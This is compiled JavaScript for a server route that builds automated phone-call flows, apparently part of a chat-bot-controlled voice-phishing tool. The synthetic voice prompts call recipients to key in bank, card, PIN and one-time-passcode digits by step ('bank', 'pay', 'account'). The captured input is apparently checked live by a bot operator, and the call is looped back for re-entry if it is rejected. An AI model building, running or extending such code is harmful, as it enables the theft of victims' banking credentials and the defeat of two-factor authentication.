"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("..");
const __2 = require("../..");
const uuid_1 = require("uuid");
const languages_1 = require("../../languages");
__1.app.all(`/verify_input/:step/:language/:chatId/:loop`, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { language, step, chatId, loop } = req.params;
    const { askCardInfo, cardType, otpLength } = req.query;
    const { valid } = Object.keys(__2.bot.context).length
        ? __2.bot.context
        : {
            valid: undefined,
        };
    const l = Number(loop) < 4 ? Number(loop) + 1 : 4;
    if ((!(l < 4) && valid === `undifined`) || valid) {
        switch (step) {
            case `bank`:
                res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call BANK STEP - ${chatId}`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangVerifyInput)({
                                    language: language,
                                    step: `bank`,
                                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                }),
                                language,
                                voice: 'female',
                            },
                            onKeypressGoto: 'nextStepGoto',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 8,
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepGoto',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 8,
                        },
                        {
                            id: 'nextStepGoto',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
                            },
                        },
                    ],
                });
                __2.bot.context = {};
                return;
            case `pay`:
                res.json({
                    id: (0, uuid_1.v4)(),
                    title: `call PAY STEP - ${chatId}`,
                    record: false,
                    steps: [
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'say',
                            options: {
                                payload: (0, languages_1.getLangVerifyInput)({
                                    language: language,
                                    step: `pay`,
                                    cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                }),
                                language,
                                voice: 'female',
                            },
                            onKeypressGoto: 'nextStepGoto',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 8,
                        },
                        {
                            id: (0, uuid_1.v4)(),
                            action: 'pause',
                            options: {
                                length: 5,
                            },
                            onKeypressGoto: 'nextStepGoto',
                            onKeypressVar: 'dtmf',
                            endKey: '#',
                            maxNumKeys: 8,
                        },
                        {
                            id: 'nextStepGoto',
                            action: 'fetchCallFlow',
                            options: {
                                url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
                            },
                        },
                    ],
                });
                __2.bot.context = {};
                return;
            case `account`:
                if (askCardInfo === 'yes') {
                    res.json({
                        id: (0, uuid_1.v4)(),
                        title: `call PAY STEP - ${chatId}`,
                        record: false,
                        steps: [
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'say',
                                options: {
                                    payload: (0, languages_1.getLangVerifyInput)({
                                        language: language,
                                        step: `account`,
                                        sp: `1`,
                                        cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                    }),
                                    language,
                                    voice: 'female',
                                },
                                onKeypressGoto: 'nextStepGoto',
                                onKeypressVar: 'dtmf',
                                endKey: '#',
                                maxNumKeys: 18,
                            },
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'pause',
                                options: {
                                    length: 5,
                                },
                                onKeypressGoto: 'nextStepGoto',
                                onKeypressVar: 'dtmf',
                                endKey: '#',
                                maxNumKeys: 18,
                            },
                            {
                                id: 'nextStepGoto',
                                action: 'fetchCallFlow',
                                options: {
                                    url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes&otpLength=${otpLength}`,
                                },
                            },
                        ],
                    });
                    __2.bot.context = {};
                    return;
                }
                else {
                    res.json({
                        id: (0, uuid_1.v4)(),
                        title: `call bank - ${chatId} no OTP`,
                        record: false,
                        steps: [
                            {
                                id: (0, uuid_1.v4)(),
                                action: 'say',
                                options: {
                                    payload: (0, languages_1.getLangVerifyInput)({
                                        language: language,
                                        step: `account`,
                                        sp: `2`,
                                        cardType: cardType !== 'undefined' ? String(cardType) : ``,
                                    }),
                                    language,
                                    voice: 'female',
                                },
                            },
                        ],
                    });
                    __2.bot.context = {};
                    return;
                }
            default:
                return;
        }
    }
    if (valid === false) {
        res.json({
            id: (0, uuid_1.v4)(),
            title: `call ACCOUNT STEP - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangVerifyInput)({
                            language: language,
                            step: `shared`,
                            sp: `1`,
                            cardType: cardType !== 'undefined' ? String(cardType) : ``,
                        }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 18,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}&cardType=${cardType}&otpLength=${otpLength}`,
                    },
                },
            ],
        });
        __2.bot.context = {};
        return;
    }
    res.json({
        id: (0, uuid_1.v4)(),
        title: `call ACCOUNT STEP - ${chatId}`,
        record: false,
        steps: [
            {
                id: (0, uuid_1.v4)(),
                action: 'say',
                options: {
                    payload: (0, languages_1.getLangVerifyInput)({
                        language: language,
                        step: `shared`,
                        sp: `2`,
                        cardType: cardType !== 'undefined' ? String(cardType) : ``,
                    }),
                    language,
                    voice: 'female',
                },
            },
            {
                id: (0, uuid_1.v4)(),
                action: 'pause',
                options: {
                    length: 5,
                },
            },
            {
                id: 'nextStepGoto',
                action: 'fetchCallFlow',
                options: {
                    url: `${process.env.ENDPOINT_URL}/verify_input/${step}/${language}/${chatId}/${l}?otpLength=${otpLength}`,
                },
            },
        ],
    });
    __2.bot.context = {};
    return;
}));
